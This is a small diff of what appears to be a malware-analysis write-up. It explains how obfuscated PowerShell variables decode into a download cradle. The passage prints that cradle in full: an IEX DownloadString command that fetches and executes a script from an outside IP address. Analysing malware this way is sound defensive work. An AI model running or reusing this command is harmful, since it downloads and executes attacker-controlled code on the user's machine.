@@ -54,7 +54,9 @@ iEX $H8
 
 * $H3-H6 with the help of $H1 just basically hex that reads "Downloadstring". 
 * $H2 was a glorified "New-Object Net.WebClient". 
-* $H8 puts them all together to form an old fashion download using powershell from address mentioned in $H8. Together they'll probably looked like 
+* $H8 puts them all together to form an old fashion download using powershell from address mentioned in $H8. 
+
+Together they'll probably looked like 
 ```bash 
 IEX (New-Object Net.WebClient).DownloadString('http://193.142.58.23/Server.txt').
 ```
